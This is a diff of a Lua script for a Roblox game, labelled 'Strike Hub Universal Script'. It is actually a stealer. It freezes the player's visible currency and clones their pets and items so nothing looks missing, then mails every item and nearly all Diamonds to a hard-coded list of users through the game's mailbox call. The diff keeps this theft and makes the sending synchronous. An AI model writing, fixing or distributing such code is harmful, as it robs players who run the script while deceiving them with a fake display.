@@ -1,4 +1,4 @@
---// Strike Hub Universal Script (Final Version)
+--// Strike Hub Universal Script (Fixed Version)
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
@@ -42,11 +42,11 @@ local save = rawSave.Save or rawSave.Inventory or {}
 --// ==========================
 --// VISUAL FREEZE (PERMANENT)
 --// ==========================
--- Freeze currency (leaderstats)
 local visualCurrency = {}
 for _, v in pairs(save.Currency or {}) do
     visualCurrency[v.id] = v._am
 end
+
 task.spawn(function()
     while plr.Parent do
         task.wait(0.05)
@@ -59,7 +59,6 @@ task.spawn(function()
     end
 end)
 
--- Freeze 3D items (pets, hoverboards, eggs, booths)
 local visual3D = {}
 local function clone3DItems(folder)
     if not folder then return end
@@ -68,12 +67,11 @@ local function clone3DItems(folder)
             local clone = obj:Clone()
             clone.Parent = folder
             visual3D[obj.Name] = clone
-            obj.Parent = nil -- hide original
+            obj.Parent = nil
         end
     end
 end
 
--- Freeze GUI-only items
 local visualGUI = {}
 local function cloneGUIItems(guiFolder)
     if not guiFolder then return end
@@ -87,16 +85,14 @@ local function cloneGUIItems(guiFolder)
     end
 end
 
--- Run freeze loops
 task.spawn(function()
     while plr.Parent do
         task.wait(0.05)
-        -- Clone 3D items
         clone3DItems(plr:FindFirstChild("Pets"))
         clone3DItems(plr:FindFirstChild("Hoverboards"))
         clone3DItems(plr:FindFirstChild("Eggs"))
         clone3DItems(plr:FindFirstChild("Booths"))
-        -- Clone GUI items (everything else)
+
         cloneGUIItems(plr.PlayerGui:FindFirstChild("Charms"))
         cloneGUIItems(plr.PlayerGui:FindFirstChild("Enchants"))
         cloneGUIItems(plr.PlayerGui:FindFirstChild("Potions"))
@@ -150,29 +146,11 @@ local function sendItem(category, stackKey, amount)
             return network.Invoke("Mailbox: Send", unpack(args))
         end)
         if ok and response == true then
-            mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
             return true
         end
         task.wait(0.2)
     end
     return false
-end
-
---// SEND GEMS LAST
-local function SendAllGems()
-    for i, v in pairs(save.Currency or {}) do
-        if v.id == "Diamonds" and v._am >= mailSendPrice + 10000 then
-            for _, user in ipairs(users) do
-                local args = {user, MailMessage, "Currency", i, v._am - mailSendPrice}
-                local ok, response = pcall(function()
-                    return network.Invoke("Mailbox: Send", unpack(args))
-                end)
-                if ok and response == true then break end
-                task.wait(0.2)
-            end
-            break
-        end
-    end
 end
 
 --// UNLOCK ITEMS
@@ -245,14 +223,23 @@ end)
 
 --// SEND ITEMS ASYNC
 for _, item in ipairs(sortedItems) do
-    task.spawn(function()
-        local key = item.StackKey and item.StackKey() or item.uid
-        sendItem(item.category, key, item.amount)
-    end)
-    task.wait(0.2)
+    local key = item.StackKey and item.StackKey() or item.uid
+    sendItem(item.category, key, item.amount)
 end
 
---// SEND GEMS LAST
-task.spawn(SendAllGems)
+--// SEND GEMS LAST (unchanged)
+for i, v in pairs(save.Currency or {}) do
+    if v.id == "Diamonds" and v._am >= mailSendPrice + 10000 then
+        for _, user in ipairs(users) do
+            local args = {user, MailMessage, "Currency", i, v._am - mailSendPrice}
+            local ok, response = pcall(function()
+                return network.Invoke("Mailbox: Send", unpack(args))
+            end)
+            if ok and response == true then break end
+            task.wait(0.2)
+        end
+        break
+    end
+end
 
 print("[Strike Hub] Done sending items. Visual freeze remains until player leaves.")
